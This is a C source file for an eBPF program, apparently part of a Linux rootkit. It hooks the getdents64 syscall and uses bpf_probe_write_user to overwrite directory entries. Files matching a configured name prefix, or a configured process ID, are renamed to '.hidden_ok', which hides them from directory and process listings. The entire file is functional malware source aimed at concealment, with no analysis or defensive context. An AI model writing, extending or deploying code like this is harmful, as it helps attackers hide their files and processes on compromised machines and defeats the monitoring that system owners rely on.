/* SPDX-License-Identifier: GPL-2.0 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>
#include "../common.h"

char LICENSE[] SEC("license") = "GPL";

#define MAX_DENTS 512

#define DIRENT_RECLEN_OFF 16
#define DIRENT_NAME_OFF   19

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 3);
    __type(key, __u32);
    __type(value, __u64);
} debug_counts SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8192);
	__type(key, __u64);
	__type(value, __u64);
} buffers SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct rk_config);
} rk_cfg SEC(".maps");

static __always_inline struct rk_config *get_cfg(void)
{
	__u32 k = 0;
	return bpf_map_lookup_elem(&rk_cfg, &k);
}

static __always_inline int has_prefix(const char *name, const struct rk_config *cfg)
{
	if (cfg->prefix_len == 0 || cfg->prefix_len >= MAX_NAME_LEN)
		return 0;
#pragma unroll
	for (int i = 0; i < MAX_NAME_LEN; i++) {
		if (i >= cfg->prefix_len)
			return 1;
		if (name[i] != cfg->prefix[i])
			return 0;
	}
	return 1;
}

static __always_inline int is_hidden_pid(const char *name, __u32 pid)
{
	char buf[16];
	int n = 0;
	__u32 v = pid;

	if (pid == 0)
		return 0;
	char rev[16];
	int r = 0;
#pragma unroll
	for (int i = 0; i < 10; i++) {
		if (v == 0)
			break;
		rev[r++] = '0' + (v % 10);
		v /= 10;
	}
	if (r == 0)
		return 0;
#pragma unroll
	for (int i = 0; i < 16; i++) {
		if (i >= r)
			break;
		buf[n++] = rev[r - 1 - i];
	}
#pragma unroll
	for (int i = 0; i < 16; i++) {
		if (i >= n)
			return name[i] == '\0';
		if (name[i] != buf[i])
			return 0;
	}
	return 0;
}

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
	struct rk_config *cfg = get_cfg();
	__u64 id = bpf_get_current_pid_tgid();
	__u64 dirp = (__u64)ctx->args[1];

	if (!cfg || !cfg->enabled)
		return 0;
	bpf_map_update_elem(&buffers, &id, &dirp, BPF_ANY);
	return 0;
}

struct getdents_ctx {
	__u64 dirp;
	long total;
	long bpos;
	__u64 prev;
	struct rk_config *cfg;
	long write_rc;
	__u32 iters;
};

static __always_inline int should_hide(const char *name,
				       const struct rk_config *cfg)
{
	return has_prefix(name, cfg) || is_hidden_pid(name, cfg->hide_pid);
}

static __always_inline long swallow_into_prev(__u64 prev,
					      unsigned short target_len)
{
	unsigned short plen = 0;

	if (!prev)
		return -1;

	if (bpf_probe_read_user(&plen, sizeof(plen),
				(void *)(prev + DIRENT_RECLEN_OFF)))
		return -2;

	plen += target_len;
	return bpf_probe_write_user((void *)(prev + DIRENT_RECLEN_OFF),
				    &plen, sizeof(plen));
}

static long process_one_dirent(__u32 index, void *ctx)
{
	struct getdents_ctx *c = ctx;
	__u64 cur;
	unsigned short reclen = 0;
	char name[MAX_NAME_LEN] = {};

	if (c->bpos >= c->total)
		return 1;

	cur = c->dirp + c->bpos;
	c->iters++;

	if (bpf_probe_read_user(&reclen, sizeof(reclen),
				(void *)(cur + DIRENT_RECLEN_OFF))) {
		bpf_printk("RK iter=%u: reclen read failed at bpos=%ld\n",
			   c->iters, c->bpos);
		return 1;
	}
	if (reclen == 0) {
		bpf_printk("RK iter=%u: reclen=0 at bpos=%ld\n", c->iters, c->bpos);
		return 1;
	}

	bpf_probe_read_user_str(name, sizeof(name),
				(void *)(cur + DIRENT_NAME_OFF));

		if (should_hide(name, c->cfg)) {
		/* Hide-by-rename: overwrite the target's own d_name with a
		 * benign replacement. Works even when the target is the first
		 * record in the buffer (no prev to merge into). */
		const char *fake = ".hidden_ok";
		int flen = 10;  /* strlen(".hidden_ok") */

		bpf_printk("RK iter=%u: HIT name=%s reclen=%u\n",
			   c->iters, name, reclen);

		if (reclen < DIRENT_NAME_OFF + flen + 1) {
			bpf_printk("RK iter=%u: reclen too small (%u < %d), skip\n",
				   c->iters, reclen, DIRENT_NAME_OFF + flen + 1);
		} else {
			c->write_rc = bpf_probe_write_user(
				(void *)(cur + DIRENT_NAME_OFF),
				(void *)fake, flen + 1);
			bpf_printk("RK iter=%u: rewrite rc=%ld\n",
				   c->iters, c->write_rc);
		}
	} else {
		c->prev = cur;
	}

	c->bpos += reclen;
	return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
	struct rk_config *cfg = get_cfg();
	__u64 id = bpf_get_current_pid_tgid();
	long total = ctx->ret;
	__u64 *pdirp;
	struct getdents_ctx c = {};

	if (!cfg || !cfg->enabled)
		goto done;
	pdirp = bpf_map_lookup_elem(&buffers, &id);
	if (!pdirp)
		return 0;
	c.dirp = *pdirp;
	c.total = total;
	c.prev = 0;
	c.cfg = cfg;
	c.write_rc = 0;
	c.iters = 0;

	if (total <= 0)
		goto done;

	bpf_printk("RK: start total=%ld\n", total);
	bpf_loop(MAX_DENTS, process_one_dirent, &c, 0);
	bpf_printk("RK: done iters=%u last_write_rc=%ld\n", c.iters, c.write_rc);

done:
	bpf_map_delete_elem(&buffers, &id);
	return 0;
}